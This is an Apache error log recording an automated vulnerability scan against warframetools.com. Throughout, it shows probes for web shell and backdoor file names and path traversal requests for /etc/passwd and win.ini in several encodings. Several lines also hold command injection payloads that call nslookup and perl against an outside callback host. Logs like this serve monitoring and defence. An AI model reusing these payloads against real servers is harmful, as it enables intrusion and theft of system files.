[Thu Jul 08 00:24:32.568965 2021] [php7:error] [pid 29544] [client 27.147.202.214:6374] script '/var/www/html/warframetools.com/images/_notes/r57shell.php' not found or unable to stat
[Thu Jul 08 00:24:32.683714 2021] [php7:error] [pid 29527] [client 27.147.202.214:13474] script '/var/www/html/warframetools.com/images/_notes/webadmin.php' not found or unable to stat
[Thu Jul 08 00:24:32.874772 2021] [php7:error] [pid 29369] [client 27.147.202.214:13473] script '/var/www/html/warframetools.com/js/extention/apc.php' not found or unable to stat
[Thu Jul 08 00:24:32.880627 2021] [php7:error] [pid 29544] [client 27.147.202.214:6374] script '/var/www/html/warframetools.com/images/_notes/r57.php' not found or unable to stat
[Thu Jul 08 00:24:33.189811 2021] [php7:error] [pid 29544] [client 27.147.202.214:6374] script '/var/www/html/warframetools.com/images/_notes/r58.php' not found or unable to stat
[Thu Jul 08 00:24:33.490992 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/images/_notes/c99shell.php' not found or unable to stat
[Thu Jul 08 00:24:33.499228 2021] [php7:error] [pid 29526] [client 27.147.202.214:13478] script '/var/www/html/warframetools.com/images/_notes/pi.php' not found or unable to stat
[Thu Jul 08 00:24:33.586024 2021] [authz_core:error] [pid 29527] [client 27.147.202.214:13474] AH01630: client denied by server configuration: /var/www/html/warframetools.com/js/extention/.htaccess
[Thu Jul 08 00:24:33.804000 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/images/_notes/c99.php' not found or unable to stat
[Thu Jul 08 00:24:34.130863 2021] [php7:error] [pid 29555] [client 27.147.202.214:8733] script '/var/www/html/warframetools.com/images/_notes/php.php' not found or unable to stat
[Thu Jul 08 00:24:34.139760 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/js/extention/phpinfo.php' not found or unable to stat
[Thu Jul 08 00:24:34.448481 2021] [php7:error] [pid 29555] [client 27.147.202.214:8733] script '/var/www/html/warframetools.com/images/_notes/i.php' not found or unable to stat
[Thu Jul 08 00:24:34.660155 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/images/_notes/nstview.php' not found or unable to stat
[Thu Jul 08 00:24:34.709657 2021] [php7:error] [pid 29507] [client 27.147.202.214:11224] script '/var/www/html/warframetools.com/js/extention/r57shell.php' not found or unable to stat
[Thu Jul 08 00:24:34.751916 2021] [php7:error] [pid 29174] [client 27.147.202.214:14957] script '/var/www/html/warframetools.com/js/extention/webadmin.php' not found or unable to stat
[Thu Jul 08 00:24:34.754657 2021] [php7:error] [pid 29555] [client 27.147.202.214:8733] script '/var/www/html/warframetools.com/images/_notes/test.php' not found or unable to stat
[Thu Jul 08 00:24:34.767844 2021] [php7:error] [pid 29545] [client 27.147.202.214:6805] script '/var/www/html/warframetools.com/js/extention/pi.php' not found or unable to stat
[Thu Jul 08 00:24:34.978320 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/images/_notes/nst.php' not found or unable to stat
[Thu Jul 08 00:24:34.999891 2021] [core:error] [pid 29554] (36)File name too long: [client 27.147.202.214:6367] AH00036: access to /;(nslookup hitwjbuiwtgvd4486f.bxss.me||perl -e "gethostbyname('hitwjbuiwtgvd4486f.bxss.me')")|(nslookup hitwjbuiwtgvd4486f.bxss.me||perl -e "gethostbyname('hitwjbuiwtgvd4486f.bxss.me')")&(nslookup hitwjbuiwtgvd4486f.bxss.me||perl -e "gethostbyname('hitwjbuiwtgvd4486f.bxss.me')")/particles.min.js failed (filesystem path '/var/www/html/warframetools.com/;(nslookup hitwjbuiwtgvd4486f.bxss.me||perl -e "gethostbyname('hitwjbuiwtgvd4486f.bxss.me')")|(nslookup hitwjbuiwtgvd4486f.bxss.me||perl -e "gethostbyname('hitwjbuiwtgvd4486f.bxss.me')")&(nslookup hitwjbuiwtgvd4486f.bxss.me||perl -e "gethostbyname('hitwjbuiwtgvd4486f.bxss.me')")')
[Thu Jul 08 00:24:35.017399 2021] [php7:error] [pid 29507] [client 27.147.202.214:11224] script '/var/www/html/warframetools.com/js/extention/r57.php' not found or unable to stat
[Thu Jul 08 00:24:35.266455 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/images/_notes/rst.php' not found or unable to stat
[Thu Jul 08 00:24:35.310932 2021] [php7:error] [pid 29507] [client 27.147.202.214:11224] script '/var/www/html/warframetools.com/js/extention/r58.php' not found or unable to stat
[Thu Jul 08 00:24:35.362974 2021] [php7:error] [pid 29548] [client 27.147.202.214:1166] script '/var/www/html/warframetools.com/js/extention/php.php' not found or unable to stat
[Thu Jul 08 00:24:35.572896 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/images/_notes/r57eng.php' not found or unable to stat
[Thu Jul 08 00:24:35.590570 2021] [php7:error] [pid 29555] [client 27.147.202.214:8733] script '/var/www/html/warframetools.com/images/_notes/temp.php' not found or unable to stat
[Thu Jul 08 00:24:35.616386 2021] [php7:error] [pid 29507] [client 27.147.202.214:11224] script '/var/www/html/warframetools.com/js/extention/c99shell.php' not found or unable to stat
[Thu Jul 08 00:24:35.671270 2021] [php7:error] [pid 29548] [client 27.147.202.214:1166] script '/var/www/html/warframetools.com/js/extention/i.php' not found or unable to stat
[Thu Jul 08 00:24:35.869245 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/images/_notes/shell.php' not found or unable to stat
[Thu Jul 08 00:24:35.896644 2021] [php7:error] [pid 29555] [client 27.147.202.214:8733] script '/var/www/html/warframetools.com/images/_notes/info.php' not found or unable to stat
[Thu Jul 08 00:24:35.912803 2021] [php7:error] [pid 29507] [client 27.147.202.214:11224] script '/var/www/html/warframetools.com/js/extention/c99.php' not found or unable to stat
[Thu Jul 08 00:24:35.974488 2021] [php7:error] [pid 29548] [client 27.147.202.214:1166] script '/var/www/html/warframetools.com/js/extention/test.php' not found or unable to stat
[Thu Jul 08 00:24:35.983804 2021] [core:error] [pid 29534] [client 27.147.202.214:2817] AH00126: Invalid URI in request GET /icons//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:24:36.182041 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/images/_notes/dra.php' not found or unable to stat
[Thu Jul 08 00:24:36.213323 2021] [php7:error] [pid 29507] [client 27.147.202.214:11224] script '/var/www/html/warframetools.com/js/extention/nstview.php' not found or unable to stat
[Thu Jul 08 00:24:36.283502 2021] [php7:error] [pid 29548] [client 27.147.202.214:1166] script '/var/www/html/warframetools.com/js/extention/temp.php' not found or unable to stat
[Thu Jul 08 00:24:36.317732 2021] [core:error] [pid 29522] [client 27.147.202.214:8732] AH00126: Invalid URI in request GET /icons//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:24:36.482202 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/images/_notes/r.php' not found or unable to stat
[Thu Jul 08 00:24:36.796615 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/images/_notes/lol.php' not found or unable to stat
[Thu Jul 08 00:24:36.841399 2021] [authz_core:error] [pid 29526] [client 27.147.202.214:13478] AH01630: client denied by server configuration: /var/www/html/warframetools.com/fonts/.htaccess~
[Thu Jul 08 00:24:37.041445 2021] [php7:error] [pid 29507] [client 27.147.202.214:11224] script '/var/www/html/warframetools.com/js/extention/nst.php' not found or unable to stat
[Thu Jul 08 00:24:37.115887 2021] [php7:error] [pid 29555] [client 27.147.202.214:8733] script '/var/www/html/warframetools.com/images/_notes/zehir.php' not found or unable to stat
[Thu Jul 08 00:24:37.117511 2021] [php7:error] [pid 29548] [client 27.147.202.214:1166] script '/var/www/html/warframetools.com/js/extention/info.php' not found or unable to stat
[Thu Jul 08 00:24:37.155161 2021] [authz_core:error] [pid 29526] [client 27.147.202.214:13478] AH01630: client denied by server configuration: /var/www/html/warframetools.com/fonts/.htaccess.old
[Thu Jul 08 00:24:37.339501 2021] [php7:error] [pid 29507] [client 27.147.202.214:11224] script '/var/www/html/warframetools.com/js/extention/rst.php' not found or unable to stat
[Thu Jul 08 00:24:37.431319 2021] [php7:error] [pid 29555] [client 27.147.202.214:8733] script '/var/www/html/warframetools.com/images/_notes/c-h.v2.php' not found or unable to stat
[Thu Jul 08 00:24:37.462798 2021] [authz_core:error] [pid 29526] [client 27.147.202.214:13478] AH01630: client denied by server configuration: /var/www/html/warframetools.com/fonts/.htaccess.save
[Thu Jul 08 00:24:37.649918 2021] [php7:error] [pid 29517] [client 27.147.202.214:14651] script '/var/www/html/warframetools.com/js/extention/r57eng.php' not found or unable to stat
[Thu Jul 08 00:24:37.744811 2021] [php7:error] [pid 29555] [client 27.147.202.214:8733] script '/var/www/html/warframetools.com/images/_notes/php-backdoor.php' not found or unable to stat
[Thu Jul 08 00:24:37.891400 2021] [core:error] [pid 29194] [client 27.147.202.214:13472] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:24:37.963784 2021] [php7:error] [pid 29517] [client 27.147.202.214:14651] script '/var/www/html/warframetools.com/js/extention/shell.php' not found or unable to stat
[Thu Jul 08 00:24:38.048561 2021] [php7:error] [pid 29555] [client 27.147.202.214:8733] script '/var/www/html/warframetools.com/images/_notes/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 00:24:38.285316 2021] [php7:error] [pid 29517] [client 27.147.202.214:14651] script '/var/www/html/warframetools.com/js/extention/dra.php' not found or unable to stat
[Thu Jul 08 00:24:38.512551 2021] [core:error] [pid 29427] [client 27.147.202.214:14733] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:24:38.607664 2021] [php7:error] [pid 29517] [client 27.147.202.214:14651] script '/var/www/html/warframetools.com/js/extention/r.php' not found or unable to stat
[Thu Jul 08 00:24:39.470750 2021] [php7:error] [pid 29517] [client 27.147.202.214:14651] script '/var/www/html/warframetools.com/js/extention/lol.php' not found or unable to stat
[Thu Jul 08 00:24:39.677024 2021] [core:error] [pid 28788] (36)File name too long: [client 27.147.202.214:6978] AH00036: access to /;(nslookup hitbrxmcjgsvpc5a5b.bxss.me||perl -e "gethostbyname('hitbrxmcjgsvpc5a5b.bxss.me')")|(nslookup hitbrxmcjgsvpc5a5b.bxss.me||perl -e "gethostbyname('hitbrxmcjgsvpc5a5b.bxss.me')")&(nslookup hitbrxmcjgsvpc5a5b.bxss.me||perl -e "gethostbyname('hitbrxmcjgsvpc5a5b.bxss.me')")/smoothscroll.js failed (filesystem path '/var/www/html/warframetools.com/;(nslookup hitbrxmcjgsvpc5a5b.bxss.me||perl -e "gethostbyname('hitbrxmcjgsvpc5a5b.bxss.me')")|(nslookup hitbrxmcjgsvpc5a5b.bxss.me||perl -e "gethostbyname('hitbrxmcjgsvpc5a5b.bxss.me')")&(nslookup hitbrxmcjgsvpc5a5b.bxss.me||perl -e "gethostbyname('hitbrxmcjgsvpc5a5b.bxss.me')")')
[Thu Jul 08 00:24:39.766086 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/js/extention/zehir.php' not found or unable to stat
[Thu Jul 08 00:24:39.767215 2021] [core:error] [pid 29517] [client 27.147.202.214:14651] AH00126: Invalid URI in request GET /icons//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:24:39.987837 2021] [php7:error] [pid 29525] [client 27.147.202.214:4044] script '/var/www/html/warframetools.com/css/_notes/h259kpnz4vvl.php' not found or unable to stat, referer: https://warframetools.com/
[Thu Jul 08 00:24:40.053347 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/js/extention/c-h.v2.php' not found or unable to stat
[Thu Jul 08 00:24:40.054150 2021] [core:error] [pid 28788] [client 27.147.202.214:6978] AH00126: Invalid URI in request GET /icons//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:24:40.346225 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/js/extention/php-backdoor.php' not found or unable to stat
[Thu Jul 08 00:24:40.660174 2021] [php7:error] [pid 29545] [client 27.147.202.214:6805] script '/var/www/html/warframetools.com/js/extention/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 00:24:40.724989 2021] [core:error] [pid 29548] [client 27.147.202.214:1166] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 00:24:43.582916 2021] [core:error] [pid 29174] [client 27.147.202.214:14957] AH00126: Invalid URI in request GET /js/extention//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 00:24:43.880278 2021] [core:error] [pid 29545] [client 27.147.202.214:6805] AH00126: Invalid URI in request GET /js/extention//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 00:24:43.927726 2021] [core:error] [pid 29555] [client 27.147.202.214:8733] AH00126: Invalid URI in request GET /icons//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:24:44.231334 2021] [core:error] [pid 29194] [client 27.147.202.214:4045] AH00126: Invalid URI in request GET /icons//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:24:45.422474 2021] [core:error] [pid 29533] [client 27.147.202.214:4046] AH00126: Invalid URI in request GET /icons//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:24:46.566327 2021] [core:error] [pid 29589] [client 27.147.202.214:11332] AH00126: Invalid URI in request GET /icons//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:24:47.377366 2021] [authz_core:error] [pid 29526] [client 27.147.202.214:13478] AH01630: client denied by server configuration: /var/www/html/warframetools.com/images/_notes/.htaccess~
[Thu Jul 08 00:24:47.677670 2021] [authz_core:error] [pid 29526] [client 27.147.202.214:13478] AH01630: client denied by server configuration: /var/www/html/warframetools.com/images/_notes/.htaccess.old
[Thu Jul 08 00:24:47.955746 2021] [authz_core:error] [pid 29526] [client 27.147.202.214:13478] AH01630: client denied by server configuration: /var/www/html/warframetools.com/images/_notes/.htaccess.save
[Thu Jul 08 00:24:51.151837 2021] [authz_core:error] [pid 29531] [client 27.147.202.214:13475] AH01630: client denied by server configuration: /var/www/html/warframetools.com/js/extention/.htaccess~
[Thu Jul 08 00:24:51.194572 2021] [core:error] [pid 29507] [client 27.147.202.214:11224] AH00126: Invalid URI in request GET /icons//../../../WEB-INF/web.xml? HTTP/1.1
[Thu Jul 08 00:24:51.249604 2021] [php7:error] [pid 29524] [client 27.147.202.214:11595] script '/var/www/html/warframetools.com/css/_notes/apc.php' not found or unable to stat
[Thu Jul 08 00:24:51.462663 2021] [authz_core:error] [pid 29531] [client 27.147.202.214:13475] AH01630: client denied by server configuration: /var/www/html/warframetools.com/js/extention/.htaccess.old
[Thu Jul 08 00:24:52.189064 2021] [core:error] [pid 29554] [client 27.147.202.214:11601] AH00126: Invalid URI in request GET /icons//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:24:52.274017 2021] [authz_core:error] [pid 29531] [client 27.147.202.214:13475] AH01630: client denied by server configuration: /var/www/html/warframetools.com/js/extention/.htaccess.save
[Thu Jul 08 00:24:52.522777 2021] [core:error] [pid 29417] (36)File name too long: [client 27.147.202.214:11602] AH00036: access to /js/extention/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/warframetools.com/js/extention/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 00:24:52.526461 2021] [authz_core:error] [pid 29363] [client 27.147.202.214:11600] AH01630: client denied by server configuration: /var/www/html/warframetools.com/css/_notes/.htaccess
[Thu Jul 08 00:24:53.329921 2021] [php7:error] [pid 29555] [client 27.147.202.214:11599] script '/var/www/html/warframetools.com/css/_notes/r57shell.php' not found or unable to stat
[Thu Jul 08 00:24:53.649390 2021] [php7:error] [pid 29555] [client 27.147.202.214:11599] script '/var/www/html/warframetools.com/css/_notes/r57.php' not found or unable to stat
[Thu Jul 08 00:24:53.811192 2021] [php7:error] [pid 29363] [client 27.147.202.214:11600] script '/var/www/html/warframetools.com/css/_notes/phpinfo.php' not found or unable to stat
